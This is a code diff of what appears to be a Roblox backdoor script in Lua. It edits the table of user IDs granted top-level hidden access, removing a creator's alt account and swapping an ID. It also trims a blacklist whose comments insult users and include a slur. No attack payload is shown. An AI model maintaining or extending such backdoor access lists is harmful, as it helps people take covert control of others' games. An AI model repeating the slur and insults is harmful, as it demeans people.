@@ -188,18 +188,13 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-	[1388703832] = {
+	[12978668] = {
 		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
-	[659119329] = {
-		['Name'] = "!fishgang Cy's Alt (Creator and ONLY dev)";
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(212,224,255);
-    };
     [1066524308] = {
-		['Name'] = "Kylee [My Gf so kill her = you die]";
+		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
@@ -279,8 +274,7 @@ local BlacklistTable = {
 	[878779033] = true; -- retard who hit me
 	[1052869632] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
 	[481265818] = true; -- said he would dox me but wouldn't
-	[872132185] = true; -- who names their child "matt"
-	[184119012] = true; -- stupid 
+	[872132185] = true; -- who names their child "matt" 
 }
 
 local SettingsTable = {
